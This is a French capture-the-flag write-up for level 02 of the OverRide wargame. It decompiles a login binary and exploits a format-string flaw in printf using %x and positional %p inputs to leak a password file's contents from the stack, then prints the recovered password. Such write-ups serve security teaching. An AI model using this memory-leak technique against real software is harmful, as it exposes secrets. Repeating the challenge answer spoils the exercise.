# LEVEL 02

On decompile le binaire avec Ghidra: 
```c
undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long lVar3;
  char *pcVar4;
  char local_118 [112];
  char local_a8 [48];
  char local_78 [100];
  int local_14;
  FILE *local_10;
  
  pcVar4 = local_78;
  for (lVar3 = 0xc; lVar3 != 0; lVar3 = lVar3 + -1) {
    pcVar4[0] = '\0';
    pcVar4[1] = '\0';
    pcVar4[2] = '\0';
    pcVar4[3] = '\0';
    pcVar4[4] = '\0';
    pcVar4[5] = '\0';
    pcVar4[6] = '\0';
    pcVar4[7] = '\0';
    pcVar4 = pcVar4 + 8;
  }
  pcVar4[0] = '\0';
  pcVar4[1] = '\0';
  pcVar4[2] = '\0';
  pcVar4[3] = '\0';
  pcVar4 = local_a8;
  for (lVar3 = 5; lVar3 != 0; lVar3 = lVar3 + -1) {
    pcVar4[0] = '\0';
    pcVar4[1] = '\0';
    pcVar4[2] = '\0';
    pcVar4[3] = '\0';
    pcVar4[4] = '\0';
    pcVar4[5] = '\0';
    pcVar4[6] = '\0';
    pcVar4[7] = '\0';
    pcVar4 = pcVar4 + 8;
  }
  *pcVar4 = '\0';
  pcVar4 = local_118;
  for (lVar3 = 0xc; lVar3 != 0; lVar3 = lVar3 + -1) {
    pcVar4[0] = '\0';
    pcVar4[1] = '\0';
    pcVar4[2] = '\0';
    pcVar4[3] = '\0';
    pcVar4[4] = '\0';
    pcVar4[5] = '\0';
    pcVar4[6] = '\0';
    pcVar4[7] = '\0';
    pcVar4 = pcVar4 + 8;
  }
  pcVar4[0] = '\0';
  pcVar4[1] = '\0';
  pcVar4[2] = '\0';
  pcVar4[3] = '\0';
  local_10 = (FILE *)0x0;
  local_14 = 0;
  local_10 = fopen("/home/users/level03/.pass","r");
  if (local_10 == (FILE *)0x0) {
    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar2 = fread(local_a8,1,0x29,local_10);
  local_14 = (int)sVar2;
  sVar2 = strcspn(local_a8,"\n");
  local_a8[sVar2] = '\0';
  if (local_14 != 0x29) {
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fclose(local_10);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets(local_78,100,stdin);
  sVar2 = strcspn(local_78,"\n");
  local_78[sVar2] = '\0';
  printf("--[ Password: ");
  fgets(local_118,100,stdin);
  sVar2 = strcspn(local_118,"\n");
  local_118[sVar2] = '\0';
  puts("*****************************************");
  iVar1 = strncmp(local_a8,local_118,0x29);
  if (iVar1 == 0) {
    printf("Greetings, %s!\n",local_78);
    system("/bin/sh");
    return 0;
  }
  printf(local_78);
  puts(" does not have access!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

On peux voir ```printf(local_78)``` ce qui montre une faille de type format string. 

On peux donc utiliser ce printf afin de faire ressortir les variables. 

```bash
--[ Username: AAAA %x %x %X %x %x %x %x %x %x %x %x %x %x %x %x %X %x %x %x %x %x %x %x %x %x %x %x %x %X %x %x %x %x %x %x %x %x %x %x %x %x %X %x %x %x %x %x %x %x %x %x %x %x %x %X %x %x %x %x %x %x %x %x %x %x %x %x %X %x %x %x %x %x %x %x %x %x %x %x %x %X %x %x %x %x %x %x %x %x %x %x %x %x %X %x %x %x %x %x %x %x %x %x %x %x %x %X %x %x %x %x %x %x %x %x %x %x
--[ Password: *****************************************
AAAA ffffe500 0 78 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 252078 0 34376848 61733951 574e6758 6e475873 664b394d feff00 41414141 25207825 20782520 78252078  does not have access!
```

les `0` montrent la fin d'une variable.
`feff00` montre potentiellement la fin d'une string.
Nous pouvons voir une suite de valeurs qui correspondrait a une string et de plus, des valeurs qcorrespondantes a des valeurs ASCII.
(`0 34376848 61733951 574e6758 6e475873 664b394d feff00`).
Nous avons donc entre le debut `0` et la fin `feff00` la chaine du mot de passe.

Systeme 64bits donc **%x** ne recupere que la moitie des informations, il faut donc utiliser **%p** a partir de **%22**

```bash
level02@OverRide:~$ echo "%22\$p %23\$p %24\$p %25\$p %26\$p" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```
`0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d` = `756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d`


CyberChef pour sortir le mot de passe de la sortie du printf - 
swap endianness

et from Hex separator space et lenght: 8 car 64bit

 ***Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H***

 
